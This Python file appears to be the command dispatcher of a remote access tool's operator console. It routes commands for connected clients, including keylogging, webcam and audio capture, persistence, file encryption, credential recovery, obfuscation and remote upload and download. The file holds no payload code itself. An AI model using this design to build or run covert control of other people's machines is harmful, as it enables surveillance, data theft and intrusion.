from domestic.session.server_handling.persistence import *
from domestic.session.server_handling.interpreter import *
from domestic.session.server_handling.messagebox import *
from domestic.session.server_handling.keylogger import *
from domestic.session.server_handling.keystroke import *
from domestic.session.server_handling.obfuscate import *
from domestic.session.server_handling.download import *
from domestic.session.server_handling.encrypt import *
from domestic.session.server_handling.recover import *
from domestic.session.server_handling.website import *
from domestic.session.server_handling.upload import *
from domestic.session.server_handling.system import *
from domestic.session.server_handling.image import *
from domestic.session.server_handling.cd import *
from domestic.session.session_message import *
from domestic.globally.exit_program import *
from domestic.globally.clear_screen import *
from domestic.session.enter_session import *
from domestic.session.exit_session import *
from domestic.shell.list_clients import *
from domestic.globally.get_help import *
from domestic.globally.sockets import *
from domestic.globally.options import *
from domestic.modules.stream import *
from domestic.modules.audio import *
from domestic.modules.talk import *
from domestic.global_state import *
from domestic.shell.server import *
from domestic.shell.delete import *
from domestic.shell.stdout import *
from domestic.modules.cam import *


def command_validation(message):
  low_message = message['message'].lower()

  if low_message == 'help':
    get_help()
  elif low_message == 'exit':
    exit_program()
  elif low_message == 'clear':
    clear_screen()
  elif low_message == 'sockets':
    sockets()
  elif low_message == 'options':
    options(message)
  elif low_message == 'stream':
    stream(message)
  elif low_message == 'cam':
    cam(message)
  elif low_message == 'audio':
    audio(message)
  elif low_message == 'talk':
    talk(message)
  elif state['session']['active']:
    if low_message == 'break':
      exit_session()
    elif low_message == 'cd':
      cd(message)
    elif low_message == 'image':
      image(message)
    elif low_message == 'upload':
      upload(message)
    elif low_message == 'download':
      download(message)
    elif low_message == 'encrypt':
      encrypt(message)
    elif low_message == 'interpreter':
      interpreter(message)
    elif low_message == 'keylogger':
      keylogger(message)
    elif low_message == 'keystroke':
      keystroke(message)
    elif low_message == 'persistence':
      persistence(message)
    elif low_message == 'system':
      system(message)
    elif low_message == 'recover':
      recover(message)
    elif low_message == 'obfuscate':
      obfuscate(message)
    elif low_message == 'website':
      website(message)
    elif low_message == 'messagebox':
      messagebox(message)
    else:
      session_message(message)
  else:
    if low_message == 'list':
      list_clients()
    elif low_message == 'server':
      server(message)
    elif low_message == 'delete':
      delete(message)
    elif low_message == 'session':
      enter_session(message)
    else:
      stdout(low_message, message)